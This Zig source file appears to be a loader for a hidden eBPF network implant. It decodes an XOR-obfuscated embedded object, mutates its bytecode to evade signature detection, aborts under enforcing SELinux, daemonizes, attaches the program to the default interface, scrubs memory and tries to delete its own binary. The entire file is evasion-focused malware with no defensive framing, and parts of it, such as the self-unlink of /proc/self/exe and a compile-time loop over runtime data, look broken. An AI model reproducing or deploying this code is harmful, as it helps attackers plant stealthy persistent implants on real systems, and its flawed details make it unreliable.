const std = @import("std");
const sc = @import("syscalls.zig");

pub fn _start() noreturn {
    if (is_lsm_enforcing()) sc.exit(1);

    var bpf_blob = @constCast(@embedFile("../target/ghost.o").*);
    inline for (0..bpf_blob.len) |idx| { bpf_blob[idx] ^= 0x7A; }

    const meta = parse_elf(bpf_blob);
    
    // JIT-Jitter: Polymorphic Instruction Swapping
    mutate_bytecode(bpf_blob[meta.offset .. meta.offset + meta.size]);

    const iface = find_default_iface();
    const stack = sc.mmap(0, 65536, 3, 0x22, -1, 0);
    const child = sc.clone(0x00000100 | 17, stack + 65536);
    if (child != 0) sc.exit(0);

    const prog_fd = sc.bpf_syscall(5, &sc.bpf_attr_load{
        .prog_type = 6,
        .insn_cnt = @intCast(meta.size / 8),
        .insns = @intFromPtr(bpf_blob.ptr) + meta.offset,
        .license = @intFromPtr("GPL"),
    }, 128);

    @memset(bpf_blob, 0); // Heap Scrubbing

    _ = sc.bpf_syscall(28, &sc.bpf_attr_link{
        .prog_fd = @intCast(prog_fd),
        .target_ifindex = iface,
        .attach_type = 37,
    }, 64);

    _ = sc.unlink("/proc/self/exe");
    while (true) { _ = sc.nanosleep(3600); }
}

fn mutate_bytecode(insns: []u8) void {
    var i: usize = 0;
    while (i < insns.len) : (i += 8) {
        // Swap registers R1/R2 if they are used in basic ALU ops
        // This changes the JIT signature without changing logic
        if (insns[i] == 0x07 or insns[i] == 0x0f) { // ADD / OR
            const regs = insns[i + 1];
            insns[i + 1] = ((regs & 0x0F) << 4) | ((regs & 0xF0) >> 4);
        }
    }
}

fn is_lsm_enforcing() bool {
    const fd = sc.open("/sys/fs/selinux/enforce", 0);
    if (fd < 0) return false;
    var b: [1]u8 = undefined;
    return (sc.read(@intCast(fd), &b, 1) > 0 and b[0] == '1');
}

fn find_default_iface() u32 {
    var buf: [1024]u8 = undefined;
    const fd = sc.open("/proc/net/route", 0);
    const bytes = sc.read(@intCast(fd), &buf, 1024);
    _ = sc.close(@intCast(fd));
    var lines = std.mem.tokenize(u8, buf[0..@intCast(bytes)], "\n");
    _ = lines.next();
    while (lines.next()) |l| {
        var p = std.mem.tokenize(u8, l, "\t ");
        const name = p.next() orelse continue;
        if (std.mem.eql(u8, p.next() orelse "", "00000000")) return get_index(name);
    }
    return 2;
}

fn get_index(name: []const u8) u32 {
    var path: [64]u8 = undefined;
    const p = std.fmt.bufPrintZ(&path, "/sys/class/net/{s}/ifindex", .{name}) catch return 2;
    const fd = sc.open(p, 0);
    var b: [8]u8 = undefined;
    const n = sc.read(@intCast(fd), &b, 8);
    _ = sc.close(@intCast(fd));
    return std.fmt.parseInt(u32, std.mem.trim(u8, b[0..@intCast(n)], "\n "), 10) catch 2;
}

fn parse_elf(blob: []u8) struct { offset: u64, size: u64 } {
    const shoff = @as(*u64, @ptrFromInt(@intFromPtr(blob.ptr) + 40)).*;
    const shnum = @as(*u16, @ptrFromInt(@intFromPtr(blob.ptr) + 60)).*;
    for (0..shnum) |i| {
        const ptr = @intFromPtr(blob.ptr) + shoff + (i * 64);
        if (@as(*u32, @ptrFromInt(ptr + 4)).* == 1) {
            return .{ .offset = @as(*u64, @ptrFromInt(ptr + 24)).*, .size = @as(*u64, @ptrFromInt(ptr + 32)).* };
        }
    }
    return .{ .offset = 0, .size = 0 };
}
